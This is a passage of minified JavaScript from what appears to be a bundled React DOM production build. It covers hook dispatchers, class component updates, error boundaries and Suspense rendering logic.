    return (
      (i = i()),
      a(i),
      function () {
        a(null);
      }
    );
  if (a != null)
    return (
      (i = i()),
      (a.current = i),
      function () {
        a.current = null;
      }
    );
}
function qi(i, a, o) {
  return (
    (o = o != null ? o.concat([i]) : null), li(4, 4, pi.bind(null, a, i), o)
  );
}
function ri() {}
function si(i, a) {
  var o = Uh();
  a = a === void 0 ? null : a;
  var s = o.memoizedState;
  return s !== null && a !== null && Mh(a, s[1])
    ? s[0]
    : ((o.memoizedState = [i, a]), i);
}
function ti(i, a) {
  var o = Uh();
  a = a === void 0 ? null : a;
  var s = o.memoizedState;
  return s !== null && a !== null && Mh(a, s[1])
    ? s[0]
    : ((i = i()), (o.memoizedState = [i, a]), i);
}
function ui(i, a, o) {
  return Hh & 21
    ? (He$1(o, a) ||
        ((o = yc()), (M$1.lanes |= o), (rh |= o), (i.baseState = !0)),
      a)
    : (i.baseState && ((i.baseState = !1), (dh = !0)), (i.memoizedState = o));
}
function vi(i, a) {
  var o = C$1;
  (C$1 = o !== 0 && 4 > o ? o : 4), i(!0);
  var s = Gh.transition;
  Gh.transition = {};
  try {
    i(!1), a();
  } finally {
    (C$1 = o), (Gh.transition = s);
  }
}
function wi() {
  return Uh().memoizedState;
}
function xi(i, a, o) {
  var s = yi(i);
  if (
    ((o = {
      lane: s,
      action: o,
      hasEagerState: !1,
      eagerState: null,
      next: null,
    }),
    zi(i))
  )
    Ai(a, o);
  else if (((o = hh(i, a, o, s)), o !== null)) {
    var tt = R$1();
    gi(o, i, s, tt), Bi(o, a, s);
  }
}
function ii(i, a, o) {
  var s = yi(i),
    tt = {
      lane: s,
      action: o,
      hasEagerState: !1,
      eagerState: null,
      next: null,
    };
  if (zi(i)) Ai(a, tt);
  else {
    var nt = i.alternate;
    if (
      i.lanes === 0 &&
      (nt === null || nt.lanes === 0) &&
      ((nt = a.lastRenderedReducer), nt !== null)
    )
      try {
        var ot = a.lastRenderedState,
          st = nt(ot, o);
        if (((tt.hasEagerState = !0), (tt.eagerState = st), He$1(st, ot))) {
          var ft = a.interleaved;
          ft === null
            ? ((tt.next = tt), gh(a))
            : ((tt.next = ft.next), (ft.next = tt)),
            (a.interleaved = tt);
          return;
        }
      } catch {
      } finally {
      }
    (o = hh(i, a, tt, s)),
      o !== null && ((tt = R$1()), gi(o, i, s, tt), Bi(o, a, s));
  }
}
function zi(i) {
  var a = i.alternate;
  return i === M$1 || (a !== null && a === M$1);
}
function Ai(i, a) {
  Jh = Ih = !0;
  var o = i.pending;
  o === null ? (a.next = a) : ((a.next = o.next), (o.next = a)),
    (i.pending = a);
}
function Bi(i, a, o) {
  if (o & 4194240) {
    var s = a.lanes;
    (s &= i.pendingLanes), (o |= s), (a.lanes = o), Cc(i, o);
  }
}
var Rh = {
    readContext: eh,
    useCallback: P,
    useContext: P,
    useEffect: P,
    useImperativeHandle: P,
    useInsertionEffect: P,
    useLayoutEffect: P,
    useMemo: P,
    useReducer: P,
    useRef: P,
    useState: P,
    useDebugValue: P,
    useDeferredValue: P,
    useTransition: P,
    useMutableSource: P,
    useSyncExternalStore: P,
    useId: P,
    unstable_isNewReconciler: !1,
  },
  Oh = {
    readContext: eh,
    useCallback: function (i, a) {
      return (Th().memoizedState = [i, a === void 0 ? null : a]), i;
    },
    useContext: eh,
    useEffect: mi,
    useImperativeHandle: function (i, a, o) {
      return (
        (o = o != null ? o.concat([i]) : null),
        ki(4194308, 4, pi.bind(null, a, i), o)
      );
    },
    useLayoutEffect: function (i, a) {
      return ki(4194308, 4, i, a);
    },
    useInsertionEffect: function (i, a) {
      return ki(4, 2, i, a);
    },
    useMemo: function (i, a) {
      var o = Th();
      return (
        (a = a === void 0 ? null : a), (i = i()), (o.memoizedState = [i, a]), i
      );
    },
    useReducer: function (i, a, o) {
      var s = Th();
      return (
        (a = o !== void 0 ? o(a) : a),
        (s.memoizedState = s.baseState = a),
        (i = {
          pending: null,
          interleaved: null,
          lanes: 0,
          dispatch: null,
          lastRenderedReducer: i,
          lastRenderedState: a,
        }),
        (s.queue = i),
        (i = i.dispatch = xi.bind(null, M$1, i)),
        [s.memoizedState, i]
      );
    },
    useRef: function (i) {
      var a = Th();
      return (i = { current: i }), (a.memoizedState = i);
    },
    useState: hi,
    useDebugValue: ri,
    useDeferredValue: function (i) {
      return (Th().memoizedState = i);
    },
    useTransition: function () {
      var i = hi(!1),
        a = i[0];
      return (i = vi.bind(null, i[1])), (Th().memoizedState = i), [a, i];
    },
    useMutableSource: function () {},
    useSyncExternalStore: function (i, a, o) {
      var s = M$1,
        tt = Th();
      if (I$1) {
        if (o === void 0) throw Error(p$1(407));
        o = o();
      } else {
        if (((o = a()), Q$1 === null)) throw Error(p$1(349));
        Hh & 30 || di(s, a, o);
      }
      tt.memoizedState = o;
      var nt = { value: o, getSnapshot: a };
      return (
        (tt.queue = nt),
        mi(ai.bind(null, s, nt, i), [i]),
        (s.flags |= 2048),
        bi(9, ci.bind(null, s, nt, o, a), void 0, null),
        o
      );
    },
    useId: function () {
      var i = Th(),
        a = Q$1.identifierPrefix;
      if (I$1) {
        var o = sg,
          s = rg;
        (o = (s & ~(1 << (32 - oc(s) - 1))).toString(32) + o),
          (a = ":" + a + "R" + o),
          (o = Kh++),
          0 < o && (a += "H" + o.toString(32)),
          (a += ":");
      } else (o = Lh++), (a = ":" + a + "r" + o.toString(32) + ":");
      return (i.memoizedState = a);
    },
    unstable_isNewReconciler: !1,
  },
  Ph = {
    readContext: eh,
    useCallback: si,
    useContext: eh,
    useEffect: $h,
    useImperativeHandle: qi,
    useInsertionEffect: ni,
    useLayoutEffect: oi,
    useMemo: ti,
    useReducer: Wh,
    useRef: ji,
    useState: function () {
      return Wh(Vh);
    },
    useDebugValue: ri,
    useDeferredValue: function (i) {
      var a = Uh();
      return ui(a, N.memoizedState, i);
    },
    useTransition: function () {
      var i = Wh(Vh)[0],
        a = Uh().memoizedState;
      return [i, a];
    },
    useMutableSource: Yh,
    useSyncExternalStore: Zh,
    useId: wi,
    unstable_isNewReconciler: !1,
  },
  Qh = {
    readContext: eh,
    useCallback: si,
    useContext: eh,
    useEffect: $h,
    useImperativeHandle: qi,
    useInsertionEffect: ni,
    useLayoutEffect: oi,
    useMemo: ti,
    useReducer: Xh,
    useRef: ji,
    useState: function () {
      return Xh(Vh);
    },
    useDebugValue: ri,
    useDeferredValue: function (i) {
      var a = Uh();
      return N === null ? (a.memoizedState = i) : ui(a, N.memoizedState, i);
    },
    useTransition: function () {
      var i = Xh(Vh)[0],
        a = Uh().memoizedState;
      return [i, a];
    },
    useMutableSource: Yh,
    useSyncExternalStore: Zh,
    useId: wi,
    unstable_isNewReconciler: !1,
  };
function Ci(i, a) {
  if (i && i.defaultProps) {
    (a = A$1({}, a)), (i = i.defaultProps);
    for (var o in i) a[o] === void 0 && (a[o] = i[o]);
    return a;
  }
  return a;
}
function Di(i, a, o, s) {
  (a = i.memoizedState),
    (o = o(s, a)),
    (o = o == null ? a : A$1({}, a, o)),
    (i.memoizedState = o),
    i.lanes === 0 && (i.updateQueue.baseState = o);
}
var Ei = {
  isMounted: function (i) {
    return (i = i._reactInternals) ? Vb(i) === i : !1;
  },
  enqueueSetState: function (i, a, o) {
    i = i._reactInternals;
    var s = R$1(),
      tt = yi(i),
      nt = mh(s, tt);
    (nt.payload = a),
      o != null && (nt.callback = o),
      (a = nh(i, nt, tt)),
      a !== null && (gi(a, i, tt, s), oh(a, i, tt));
  },
  enqueueReplaceState: function (i, a, o) {
    i = i._reactInternals;
    var s = R$1(),
      tt = yi(i),
      nt = mh(s, tt);
    (nt.tag = 1),
      (nt.payload = a),
      o != null && (nt.callback = o),
      (a = nh(i, nt, tt)),
      a !== null && (gi(a, i, tt, s), oh(a, i, tt));
  },
  enqueueForceUpdate: function (i, a) {
    i = i._reactInternals;
    var o = R$1(),
      s = yi(i),
      tt = mh(o, s);
    (tt.tag = 2),
      a != null && (tt.callback = a),
      (a = nh(i, tt, s)),
      a !== null && (gi(a, i, s, o), oh(a, i, s));
  },
};
function Fi(i, a, o, s, tt, nt, ot) {
  return (
    (i = i.stateNode),
    typeof i.shouldComponentUpdate == "function"
      ? i.shouldComponentUpdate(s, nt, ot)
      : a.prototype && a.prototype.isPureReactComponent
      ? !Ie$1(o, s) || !Ie$1(tt, nt)
      : !0
  );
}
function Gi(i, a, o) {
  var s = !1,
    tt = Vf,
    nt = a.contextType;
  return (
    typeof nt == "object" && nt !== null
      ? (nt = eh(nt))
      : ((tt = Zf(a) ? Xf : H$1.current),
        (s = a.contextTypes),
        (nt = (s = s != null) ? Yf(i, tt) : Vf)),
    (a = new a(o, nt)),
    (i.memoizedState = a.state !== null && a.state !== void 0 ? a.state : null),
    (a.updater = Ei),
    (i.stateNode = a),
    (a._reactInternals = i),
    s &&
      ((i = i.stateNode),
      (i.__reactInternalMemoizedUnmaskedChildContext = tt),
      (i.__reactInternalMemoizedMaskedChildContext = nt)),
    a
  );
}
function Hi(i, a, o, s) {
  (i = a.state),
    typeof a.componentWillReceiveProps == "function" &&
      a.componentWillReceiveProps(o, s),
    typeof a.UNSAFE_componentWillReceiveProps == "function" &&
      a.UNSAFE_componentWillReceiveProps(o, s),
    a.state !== i && Ei.enqueueReplaceState(a, a.state, null);
}
function Ii(i, a, o, s) {
  var tt = i.stateNode;
  (tt.props = o), (tt.state = i.memoizedState), (tt.refs = {}), kh(i);
  var nt = a.contextType;
  typeof nt == "object" && nt !== null
    ? (tt.context = eh(nt))
    : ((nt = Zf(a) ? Xf : H$1.current), (tt.context = Yf(i, nt))),
    (tt.state = i.memoizedState),
    (nt = a.getDerivedStateFromProps),
    typeof nt == "function" && (Di(i, a, nt, o), (tt.state = i.memoizedState)),
    typeof a.getDerivedStateFromProps == "function" ||
      typeof tt.getSnapshotBeforeUpdate == "function" ||
      (typeof tt.UNSAFE_componentWillMount != "function" &&
        typeof tt.componentWillMount != "function") ||
      ((a = tt.state),
      typeof tt.componentWillMount == "function" && tt.componentWillMount(),
      typeof tt.UNSAFE_componentWillMount == "function" &&
        tt.UNSAFE_componentWillMount(),
      a !== tt.state && Ei.enqueueReplaceState(tt, tt.state, null),
      qh(i, o, tt, s),
      (tt.state = i.memoizedState)),
    typeof tt.componentDidMount == "function" && (i.flags |= 4194308);
}
function Ji(i, a) {
  try {
    var o = "",
      s = a;
    do (o += Pa(s)), (s = s.return);
    while (s);
    var tt = o;
  } catch (nt) {
    tt =
      `
Error generating stack: ` +
      nt.message +
      `
` +
      nt.stack;
  }
  return { value: i, source: a, stack: tt, digest: null };
}
function Ki(i, a, o) {
  return { value: i, source: null, stack: o ?? null, digest: a ?? null };
}
function Li(i, a) {
  try {
    console.error(a.value);
  } catch (o) {
    setTimeout(function () {
      throw o;
    });
  }
}
var Mi = typeof WeakMap == "function" ? WeakMap : Map;
function Ni(i, a, o) {
  (o = mh(-1, o)), (o.tag = 3), (o.payload = { element: null });
  var s = a.value;
  return (
    (o.callback = function () {
      Oi || ((Oi = !0), (Pi = s)), Li(i, a);
    }),
    o
  );
}
function Qi(i, a, o) {
  (o = mh(-1, o)), (o.tag = 3);
  var s = i.type.getDerivedStateFromError;
  if (typeof s == "function") {
    var tt = a.value;
    (o.payload = function () {
      return s(tt);
    }),
      (o.callback = function () {
        Li(i, a);
      });
  }
  var nt = i.stateNode;
  return (
    nt !== null &&
      typeof nt.componentDidCatch == "function" &&
      (o.callback = function () {
        Li(i, a),
          typeof s != "function" &&
            (Ri === null ? (Ri = new Set([this])) : Ri.add(this));
        var ot = a.stack;
        this.componentDidCatch(a.value, {
          componentStack: ot !== null ? ot : "",
        });
      }),
    o
  );
}
function Si(i, a, o) {
  var s = i.pingCache;
  if (s === null) {
    s = i.pingCache = new Mi();
    var tt = new Set();
    s.set(a, tt);
  } else (tt = s.get(a)), tt === void 0 && ((tt = new Set()), s.set(a, tt));
  tt.has(o) || (tt.add(o), (i = Ti.bind(null, i, a, o)), a.then(i, i));
}
function Ui(i) {
  do {
    var a;
    if (
      ((a = i.tag === 13) &&
        ((a = i.memoizedState), (a = a !== null ? a.dehydrated !== null : !0)),
      a)
    )
      return i;
    i = i.return;
  } while (i !== null);
  return null;
}
function Vi(i, a, o, s, tt) {
  return i.mode & 1
    ? ((i.flags |= 65536), (i.lanes = tt), i)
    : (i === a
        ? (i.flags |= 65536)
        : ((i.flags |= 128),
          (o.flags |= 131072),
          (o.flags &= -52805),
          o.tag === 1 &&
            (o.alternate === null
              ? (o.tag = 17)
              : ((a = mh(-1, 1)), (a.tag = 2), nh(o, a, 1))),
          (o.lanes |= 1)),
      i);
}
var Wi = ua.ReactCurrentOwner,
  dh = !1;
function Xi(i, a, o, s) {
  a.child = i === null ? Vg(a, null, o, s) : Ug(a, i.child, o, s);
}
function Yi(i, a, o, s, tt) {
  o = o.render;
  var nt = a.ref;
  return (
    ch(a, tt),
    (s = Nh(i, a, o, s, nt, tt)),
    (o = Sh()),
    i !== null && !dh
      ? ((a.updateQueue = i.updateQueue),
        (a.flags &= -2053),
        (i.lanes &= ~tt),
        Zi(i, a, tt))
      : (I$1 && o && vg(a), (a.flags |= 1), Xi(i, a, s, tt), a.child)
  );
}
function $i(i, a, o, s, tt) {
  if (i === null) {
    var nt = o.type;
    return typeof nt == "function" &&
      !aj(nt) &&
      nt.defaultProps === void 0 &&
      o.compare === null &&
      o.defaultProps === void 0
      ? ((a.tag = 15), (a.type = nt), bj(i, a, nt, s, tt))
      : ((i = Rg(o.type, null, s, a, a.mode, tt)),
        (i.ref = a.ref),
        (i.return = a),
        (a.child = i));
  }
  if (((nt = i.child), !(i.lanes & tt))) {
    var ot = nt.memoizedProps;
    if (
      ((o = o.compare),
      (o = o !== null ? o : Ie$1),
      o(ot, s) && i.ref === a.ref)
    )
      return Zi(i, a, tt);
  }
  return (
    (a.flags |= 1),
    (i = Pg(nt, s)),
    (i.ref = a.ref),
    (i.return = a),
    (a.child = i)
  );
}
function bj(i, a, o, s, tt) {
  if (i !== null) {
    var nt = i.memoizedProps;
    if (Ie$1(nt, s) && i.ref === a.ref)
      if (((dh = !1), (a.pendingProps = s = nt), (i.lanes & tt) !== 0))
        i.flags & 131072 && (dh = !0);
      else return (a.lanes = i.lanes), Zi(i, a, tt);
  }
  return cj(i, a, o, s, tt);
}
function dj(i, a, o) {
  var s = a.pendingProps,
    tt = s.children,
    nt = i !== null ? i.memoizedState : null;
  if (s.mode === "hidden")
    if (!(a.mode & 1))
      (a.memoizedState = { baseLanes: 0, cachePool: null, transitions: null }),
        G$1(ej, fj),
        (fj |= o);
    else {
      if (!(o & 1073741824))
        return (
          (i = nt !== null ? nt.baseLanes | o : o),
          (a.lanes = a.childLanes = 1073741824),
          (a.memoizedState = {
            baseLanes: i,
            cachePool: null,
            transitions: null,
          }),
          (a.updateQueue = null),
          G$1(ej, fj),
          (fj |= i),
          null
        );
      (a.memoizedState = { baseLanes: 0, cachePool: null, transitions: null }),
        (s = nt !== null ? nt.baseLanes : o),
        G$1(ej, fj),
        (fj |= s);
    }
  else
    nt !== null ? ((s = nt.baseLanes | o), (a.memoizedState = null)) : (s = o),
      G$1(ej, fj),
      (fj |= s);
  return Xi(i, a, tt, o), a.child;
}
function gj(i, a) {
  var o = a.ref;
  ((i === null && o !== null) || (i !== null && i.ref !== o)) &&
    ((a.flags |= 512), (a.flags |= 2097152));
}
function cj(i, a, o, s, tt) {
  var nt = Zf(o) ? Xf : H$1.current;
  return (
    (nt = Yf(a, nt)),
    ch(a, tt),
    (o = Nh(i, a, o, s, nt, tt)),
    (s = Sh()),
    i !== null && !dh
      ? ((a.updateQueue = i.updateQueue),
        (a.flags &= -2053),
        (i.lanes &= ~tt),
        Zi(i, a, tt))
      : (I$1 && s && vg(a), (a.flags |= 1), Xi(i, a, o, tt), a.child)
  );
}
function hj(i, a, o, s, tt) {
  if (Zf(o)) {
    var nt = !0;
    cg(a);
  } else nt = !1;
  if ((ch(a, tt), a.stateNode === null))
    ij(i, a), Gi(a, o, s), Ii(a, o, s, tt), (s = !0);
  else if (i === null) {
    var ot = a.stateNode,
      st = a.memoizedProps;
    ot.props = st;
    var ft = ot.context,
      ht = o.contextType;
    typeof ht == "object" && ht !== null
      ? (ht = eh(ht))
      : ((ht = Zf(o) ? Xf : H$1.current), (ht = Yf(a, ht)));
    var gt = o.getDerivedStateFromProps,
      St =
        typeof gt == "function" ||
        typeof ot.getSnapshotBeforeUpdate == "function";
    St ||
      (typeof ot.UNSAFE_componentWillReceiveProps != "function" &&
        typeof ot.componentWillReceiveProps != "function") ||
      ((st !== s || ft !== ht) && Hi(a, ot, s, ht)),
      (jh = !1);
    var vt = a.memoizedState;
    (ot.state = vt),
      qh(a, s, ot, tt),
      (ft = a.memoizedState),
      st !== s || vt !== ft || Wf.current || jh
        ? (typeof gt == "function" && (Di(a, o, gt, s), (ft = a.memoizedState)),
          (st = jh || Fi(a, o, st, s, vt, ft, ht))
            ? (St ||
                (typeof ot.UNSAFE_componentWillMount != "function" &&
                  typeof ot.componentWillMount != "function") ||
                (typeof ot.componentWillMount == "function" &&
                  ot.componentWillMount(),
                typeof ot.UNSAFE_componentWillMount == "function" &&
                  ot.UNSAFE_componentWillMount()),
              typeof ot.componentDidMount == "function" && (a.flags |= 4194308))
            : (typeof ot.componentDidMount == "function" &&
                (a.flags |= 4194308),
              (a.memoizedProps = s),
              (a.memoizedState = ft)),
          (ot.props = s),
          (ot.state = ft),
          (ot.context = ht),
          (s = st))
        : (typeof ot.componentDidMount == "function" && (a.flags |= 4194308),
          (s = !1));
  } else {
    (ot = a.stateNode),
      lh(i, a),
      (st = a.memoizedProps),
      (ht = a.type === a.elementType ? st : Ci(a.type, st)),
      (ot.props = ht),
      (St = a.pendingProps),
      (vt = ot.context),
      (ft = o.contextType),
      typeof ft == "object" && ft !== null
        ? (ft = eh(ft))
        : ((ft = Zf(o) ? Xf : H$1.current), (ft = Yf(a, ft)));
    var _t = o.getDerivedStateFromProps;
    (gt =
      typeof _t == "function" ||
      typeof ot.getSnapshotBeforeUpdate == "function") ||
      (typeof ot.UNSAFE_componentWillReceiveProps != "function" &&
        typeof ot.componentWillReceiveProps != "function") ||
      ((st !== St || vt !== ft) && Hi(a, ot, s, ft)),
      (jh = !1),
      (vt = a.memoizedState),
      (ot.state = vt),
      qh(a, s, ot, tt);
    var Et = a.memoizedState;
    st !== St || vt !== Et || Wf.current || jh
      ? (typeof _t == "function" && (Di(a, o, _t, s), (Et = a.memoizedState)),
        (ht = jh || Fi(a, o, ht, s, vt, Et, ft) || !1)
          ? (gt ||
              (typeof ot.UNSAFE_componentWillUpdate != "function" &&
                typeof ot.componentWillUpdate != "function") ||
              (typeof ot.componentWillUpdate == "function" &&
                ot.componentWillUpdate(s, Et, ft),
              typeof ot.UNSAFE_componentWillUpdate == "function" &&
                ot.UNSAFE_componentWillUpdate(s, Et, ft)),
            typeof ot.componentDidUpdate == "function" && (a.flags |= 4),
            typeof ot.getSnapshotBeforeUpdate == "function" &&
              (a.flags |= 1024))
          : (typeof ot.componentDidUpdate != "function" ||
              (st === i.memoizedProps && vt === i.memoizedState) ||
              (a.flags |= 4),
            typeof ot.getSnapshotBeforeUpdate != "function" ||
              (st === i.memoizedProps && vt === i.memoizedState) ||
              (a.flags |= 1024),
            (a.memoizedProps = s),
            (a.memoizedState = Et)),
        (ot.props = s),
        (ot.state = Et),
        (ot.context = ft),
        (s = ht))
      : (typeof ot.componentDidUpdate != "function" ||
          (st === i.memoizedProps && vt === i.memoizedState) ||
          (a.flags |= 4),
        typeof ot.getSnapshotBeforeUpdate != "function" ||
          (st === i.memoizedProps && vt === i.memoizedState) ||
          (a.flags |= 1024),
        (s = !1));
  }
  return jj(i, a, o, s, nt, tt);
}
function jj(i, a, o, s, tt, nt) {
  gj(i, a);
  var ot = (a.flags & 128) !== 0;
  if (!s && !ot) return tt && dg(a, o, !1), Zi(i, a, nt);
  (s = a.stateNode), (Wi.current = a);
  var st =
    ot && typeof o.getDerivedStateFromError != "function" ? null : s.render();
  return (
    (a.flags |= 1),
    i !== null && ot
      ? ((a.child = Ug(a, i.child, null, nt)), (a.child = Ug(a, null, st, nt)))
      : Xi(i, a, st, nt),
    (a.memoizedState = s.state),
    tt && dg(a, o, !0),
    a.child
  );
}
function kj(i) {
  var a = i.stateNode;
  a.pendingContext
    ? ag(i, a.pendingContext, a.pendingContext !== a.context)
    : a.context && ag(i, a.context, !1),
    yh(i, a.containerInfo);
}
function lj(i, a, o, s, tt) {
  return Ig(), Jg(tt), (a.flags |= 256), Xi(i, a, o, s), a.child;
}
var mj = { dehydrated: null, treeContext: null, retryLane: 0 };
function nj(i) {
  return { baseLanes: i, cachePool: null, transitions: null };
}
function oj(i, a, o) {
  var s = a.pendingProps,
    tt = L$1.current,
    nt = !1,
    ot = (a.flags & 128) !== 0,
    st;
  if (
    ((st = ot) ||
      (st = i !== null && i.memoizedState === null ? !1 : (tt & 2) !== 0),
    st
      ? ((nt = !0), (a.flags &= -129))
      : (i === null || i.memoizedState !== null) && (tt |= 1),
    G$1(L$1, tt & 1),
    i === null)
  )
    return (
      Eg(a),
      (i = a.memoizedState),
      i !== null && ((i = i.dehydrated), i !== null)
        ? (a.mode & 1
            ? i.data === "$!"
              ? (a.lanes = 8)
              : (a.lanes = 1073741824)
            : (a.lanes = 1),
          null)
        : ((ot = s.children),
          (i = s.fallback),
          nt
            ? ((s = a.mode),
              (nt = a.child),
              (ot = { mode: "hidden", children: ot }),
              !(s & 1) && nt !== null
                ? ((nt.childLanes = 0), (nt.pendingProps = ot))
                : (nt = pj(ot, s, 0, null)),
              (i = Tg(i, s, o, null)),
              (nt.return = a),
              (i.return = a),
              (nt.sibling = i),
              (a.child = nt),
              (a.child.memoizedState = nj(o)),
              (a.memoizedState = mj),
              i)
            : qj(a, ot))
    );
  if (
    ((tt = i.memoizedState), tt !== null && ((st = tt.dehydrated), st !== null))
  )
    return rj(i, a, ot, s, st, tt, o);
  if (nt) {
    (nt = s.fallback), (ot = a.mode), (tt = i.child), (st = tt.sibling);
    var ft = { mode: "hidden", children: s.children };
    return (
      !(ot & 1) && a.child !== tt
        ? ((s = a.child),
          (s.childLanes = 0),
          (s.pendingProps = ft),
          (a.deletions = null))
        : ((s = Pg(tt, ft)), (s.subtreeFlags = tt.subtreeFlags & 14680064)),
      st !== null
        ? (nt = Pg(st, nt))
        : ((nt = Tg(nt, ot, o, null)), (nt.flags |= 2)),
      (nt.return = a),
      (s.return = a),
      (s.sibling = nt),
      (a.child = s),
      (s = nt),
      (nt = a.child),
      (ot = i.child.memoizedState),
      (ot =
        ot === null
          ? nj(o)
          : {
              baseLanes: ot.baseLanes | o,
              cachePool: null,
              transitions: ot.transitions,
            }),
      (nt.memoizedState = ot),
      (nt.childLanes = i.childLanes & ~o),
      (a.memoizedState = mj),
      s
    );
  }
  return (
    (nt = i.child),
    (i = nt.sibling),
    (s = Pg(nt, { mode: "visible", children: s.children })),
    !(a.mode & 1) && (s.lanes = o),
    (s.return = a),
    (s.sibling = null),
    i !== null &&
      ((o = a.deletions),
      o === null ? ((a.deletions = [i]), (a.flags |= 16)) : o.push(i)),
    (a.child = s),
    (a.memoizedState = null),
    s
  );
}
function qj(i, a) {
  return (
    (a = pj({ mode: "visible", children: a }, i.mode, 0, null)),
    (a.return = i),
    (i.child = a)
  );
}
function sj(i, a, o, s) {
  return (
    s !== null && Jg(s),
    Ug(a, i.child, null, o),
    (i = qj(a, a.pendingProps.children)),
    (i.flags |= 2),
    (a.memoizedState = null),
    i
  );
}
function rj(i, a, o, s, tt, nt, ot) {
  if (o)
    return a.flags & 256
      ? ((a.flags &= -257), (s = Ki(Error(p$1(422)))), sj(i, a, ot, s))
      : a.memoizedState !== null
      ? ((a.child = i.child), (a.flags |= 128), null)
      : ((nt = s.fallback),
        (tt = a.mode),
        (s = pj({ mode: "visible", children: s.children }, tt, 0, null)),
        (nt = Tg(nt, tt, ot, null)),
        (nt.flags |= 2),
        (s.return = a),
        (nt.return = a),
        (s.sibling = nt),
        (a.child = s),
        a.mode & 1 && Ug(a, i.child, null, ot),
        (a.child.memoizedState = nj(ot)),
        (a.memoizedState = mj),
        nt);
  if (!(a.mode & 1)) return sj(i, a, ot, null);
  if (tt.data === "$!") {
    if (((s = tt.nextSibling && tt.nextSibling.dataset), s)) var st = s.dgst;
    return (
      (s = st), (nt = Error(p$1(419))), (s = Ki(nt, s, void 0)), sj(i, a, ot, s)
    );
  }
  if (((st = (ot & i.childLanes) !== 0), dh || st)) {
    if (((s = Q$1), s !== null)) {
      switch (ot & -ot) {
        case 4:
          tt = 2;
          break;
        case 16:
          tt = 8;
          break;
        case 64:
        case 128:
        case 256:
        case 512:
        case 1024:
        case 2048:
        case 4096:
        case 8192:
        case 16384:
        case 32768:
        case 65536:
        case 131072:
        case 262144:
        case 524288:
        case 1048576:
        case 2097152:
        case 4194304:
        case 8388608:
        case 16777216:
        case 33554432:
        case 67108864:
          tt = 32;
          break;
        case 536870912:
          tt = 268435456;
          break;
        default:
          tt = 0;
      }
      (tt = tt & (s.suspendedLanes | ot) ? 0 : tt),
        tt !== 0 &&
          tt !== nt.retryLane &&
          ((nt.retryLane = tt), ih(i, tt), gi(s, i, tt, -1));
    }
    return tj(), (s = Ki(Error(p$1(421)))), sj(i, a, ot, s);
  }
  return tt.data === "$?"
    ? ((a.flags |= 128),
      (a.child = i.child),
      (a = uj.bind(null, i)),
      (tt._reactRetry = a),
      null)
    : ((i = nt.treeContext),
      (yg = Lf(tt.nextSibling)),
      (xg = a),
      (I$1 = !0),
      (zg = null),
      i !== null &&
        ((og[pg++] = rg),
        (og[pg++] = sg),
        (og[pg++] = qg),
        (rg = i.id),
        (sg = i.overflow),
        (qg = a)),
      (a = qj(a, s.children)),
      (a.flags |= 4096),
      a);
}
function vj(i, a, o) {
  i.lanes |= a;
  var s = i.alternate;
  s !== null && (s.lanes |= a), bh(i.return, a, o);
}
function wj(i, a, o, s, tt) {
  var nt = i.memoizedState;
  nt === null
    ? (i.memoizedState = {
        isBackwards: a,
        rendering: null,
        renderingStartTime: 0,
        last: s,
        tail: o,
        tailMode: tt,
      })
    : ((nt.isBackwards = a),
      (nt.rendering = null),
      (nt.renderingStartTime = 0),
      (nt.last = s),
      (nt.tail = o),
      (nt.tailMode = tt));
}
function xj(i, a, o) {
  var s = a.pendingProps,
    tt = s.revealOrder,
    nt = s.tail;
  if ((Xi(i, a, s.children, o), (s = L$1.current), s & 2))
    (s = (s & 1) | 2), (a.flags |= 128);
  else {
    if (i !== null && i.flags & 128)
      e: for (i = a.child; i !== null; ) {
        if (i.tag === 13) i.memoizedState !== null && vj(i, o, a);
        else if (i.tag === 19) vj(i, o, a);
        else if (i.child !== null) {
          (i.child.return = i), (i = i.child);
          continue;
        }
        if (i === a) break e;
        for (; i.sibling === null; ) {
          if (i.return === null || i.return === a) break e;
          i = i.return;
        }
        (i.sibling.return = i.return), (i = i.sibling);
      }
    s &= 1;
  }
  if ((G$1(L$1, s), !(a.mode & 1))) a.memoizedState = null;
  else
    switch (tt) {
      case "forwards":
        for (o = a.child, tt = null; o !== null; )
          (i = o.alternate),
            i !== null && Ch(i) === null && (tt = o),
            (o = o.sibling);
        (o = tt),
          o === null
            ? ((tt = a.child), (a.child = null))
            : ((tt = o.sibling), (o.sibling = null)),
          wj(a, !1, tt, o, nt);
        break;
      case "backwards":
        for (o = null, tt = a.child, a.child = null; tt !== null; ) {
          if (((i = tt.alternate), i !== null && Ch(i) === null)) {
            a.child = tt;
            break;
          }
          (i = tt.sibling), (tt.sibling = o), (o = tt), (tt = i);
        }
        wj(a, !0, o, null, nt);
        break;
      case "together":
        wj(a, !1, null, null, void 0);
        break;
      default:
        a.memoizedState = null;
    }
  return a.child;
}
function ij(i, a) {
  !(a.mode & 1) &&
    i !== null &&
    ((i.alternate = null), (a.alternate = null), (a.flags |= 2));
}
function Zi(i, a, o) {
  if (
    (i !== null && (a.dependencies = i.dependencies),
    (rh |= a.lanes),
    !(o & a.childLanes))
  )
    return null;
  if (i !== null && a.child !== i.child) throw Error(p$1(153));
  if (a.child !== null) {
    for (
      i = a.child, o = Pg(i, i.pendingProps), a.child = o, o.return = a;
      i.sibling !== null;

    )
      (i = i.sibling), (o = o.sibling = Pg(i, i.pendingProps)), (o.return = a);
    o.sibling = null;
  }
  return a.child;
}
function yj(i, a, o) {
  switch (a.tag) {
    case 3:
      kj(a), Ig();
      break;
    case 5:
      Ah(a);
      break;
    case 1:
      Zf(a.type) && cg(a);
      break;
    case 4:
      yh(a, a.stateNode.containerInfo);
      break;
    case 10:
      var s = a.type._context,
        tt = a.memoizedProps.value;
      G$1(Wg, s._currentValue), (s._currentValue = tt);
      break;
    case 13:
      if (((s = a.memoizedState), s !== null))
        return s.dehydrated !== null
          ? (G$1(L$1, L$1.current & 1), (a.flags |= 128), null)
          : o & a.child.childLanes
          ? oj(i, a, o)
          : (G$1(L$1, L$1.current & 1),
            (i = Zi(i, a, o)),
            i !== null ? i.sibling : null);
      G$1(L$1, L$1.current & 1);
      break;
    case 19:
      if (((s = (o & a.childLanes) !== 0), i.flags & 128)) {
        if (s) return xj(i, a, o);
        a.flags |= 128;
      }
      if (
        ((tt = a.memoizedState),
        tt !== null &&
          ((tt.rendering = null), (tt.tail = null), (tt.lastEffect = null)),
        G$1(L$1, L$1.current),
        s)
      )
        break;
      return null;
    case 22:
    case 23:
      return (a.lanes = 0), dj(i, a, o);
  }
  return Zi(i, a, o);
}
var zj, Aj, Bj, Cj;
zj = function (i, a) {
  for (var o = a.child; o !== null; ) {
    if (o.tag === 5 || o.tag === 6) i.appendChild(o.stateNode);
    else if (o.tag !== 4 && o.child !== null) {
